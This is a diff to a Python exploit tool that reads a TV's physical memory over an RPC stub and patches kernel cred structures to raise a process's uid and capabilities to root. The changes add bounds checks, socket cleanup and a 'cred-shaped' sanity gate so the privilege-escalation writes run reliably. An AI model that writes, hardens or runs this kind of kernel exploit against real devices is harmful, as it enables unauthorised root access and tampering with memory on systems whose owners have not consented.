@@ -95,6 +95,11 @@ class RPC:
                 "the RPC gateway refused the pairing (BUSY: another client is "
                 "attached, or the page/stub just reloaded). Retry after "
                 "physmap.reset_stub().")
+        except Exception:
+            # A reset/aborted connection (or a short hello) must not leak the
+            # socket in a long-lived process (review 2026-10-31).
+            self.s.close()
+            raise
         self.s.settimeout(timeout)
         self.magic, self.prctl_ret, self.open_ret = struct.unpack("<4sii", hello)
         if self.magic != b"PGDB":
@@ -152,7 +157,20 @@ class RPC:
         cannot map (it sends that page's status then returns to the main loop),
         so a bad page ends the batch.  Restart the batch after it, otherwise the
         stream desynchronises and every later read returns garbage.
+
+        Bounds: the stub caps a batch at 0x8000 pages, and the driver is known
+        to hang past phys 0x46000000 (trap) - an unbounded range used to wedge
+        the stub (review 2026-10-31).  0x46000000 is the cap, not RAM_HI: the
+        SMACK scan legitimately reads up to 0x45F00000.
         """
+        if count <= 0:
+            return
+        if count > 0x8000:
+            raise ValueError(f"readmany count {count} exceeds the stub's 0x8000 cap")
+        if first_page < RAM_LO or first_page + count * 0x1000 > 0x46000000:
+            raise ValueError(
+                f"readmany range {hexs(first_page)}+{count} pages is outside "
+                "0x20000000..0x46000000 (reads past 0x46000000 hang the driver)")
         page = first_page
         remaining = count
         while remaining > 0:
@@ -223,6 +241,13 @@ def find_image_base(rpc):
     else:
         sig = IMG_SIG
     for addr in IMAGE_BASES:
+        if addr + 8 > RAM_HI:
+            # 0x40008000 is a valid ARM Image load address, but it is above the
+            # default safe band, so read() refuses it and the probe used to look
+            # like a read failure (review 2026-10-31).  Say what it is.
+            print(f"[!] probe {hexs(addr)} skipped: above TVPHYS_HI "
+                  f"({hexs(RAM_HI)}); set TVPHYS_HI to probe it", flush=True)
+            continue
         try:
             got = rpc.read(addr, 8)
         except Exception as exc:
@@ -364,6 +389,26 @@ def patch_cred(rpc, cred_phys, dry=False, uid_gate=True):
     return patch_ids(rpc, cred_phys, uid_gate=uid_gate)
 
 
+def _sane_cred(rpc, cred):
+    """A task-pointer cred must LOOK like a cred before it is written.
+
+    Same shape gate as the payload's SaneCred and kernel_root._sane_cred: a
+    stale task field whose target +4 happens to read 5001 must never be patched
+    (review 2026-10-31 - root_cred_via_tag had no gate at all).
+    """
+    if not (0xC0000000 <= cred <= 0xFFFFFFFF) or (cred & 3):
+        return False
+    try:
+        head = rpc.read(_v2p(cred), 36)
+    except Exception:
+        return False
+    if u32(head, 0) > 0x10000:
+        return False
+    if any(v > 0x1000000 for v in struct.unpack_from("<8I", head, 4)):
+        return False
+    return struct.unpack_from("<I", head, 4)[0] < 0x100000
+
+
 def patch_full(rpc, cred, uid_gate=True):
     """Patch ids AND capabilities, like the payload's PatchCred.
 
@@ -373,6 +418,9 @@ def patch_full(rpc, cred, uid_gate=True):
     write that started from uid 5001.
     """
     if cred >= 0xC0000000:
+        if not _sane_cred(rpc, cred):
+            print(f"[-] reject {hexs(cred)}: not cred-shaped", flush=True)
+            return False
         cred = _v2p(cred)
     try:
         uid = rpc.read_u32(cred + 4)
@@ -400,10 +448,12 @@ def patch_full(rpc, cred, uid_gate=True):
 
 
 def _kernel_ptr(v):
-    # ARM32 LPAE layout on this TV: direct map is 0xC0000000..0xFFFFFFFF
-    # (1 GB; vmalloc sits BELOW 0xC0000000).  task_structs and creds are
-    # routinely allocated above 0xE0000000, so the old <0xE0000000 bound
-    # truncated the task-list walk.  Measured 2026-10-22 (post-reboot).
+    # ARM32 VMSPLIT_3G on this TV: the direct map is 0xC0000000..high_memory
+    # (measured VA 0xF0400000 from zoneinfo), and vmalloc/module space sits ABOVE
+    # the linear map.  The full kernel range is accepted for POINTER SHAPE only
+    # (trap 5); a value above high_memory is a garbage read, not a valid frame.
+    # (This comment used to claim the LPAE layout, which is not this kernel; the
+    # old <0xE0000000 bound truncated the task-list walk - measured 2026-10-22.)
     return 0xC0000000 <= v <= 0xFFFFFFFF
 
 
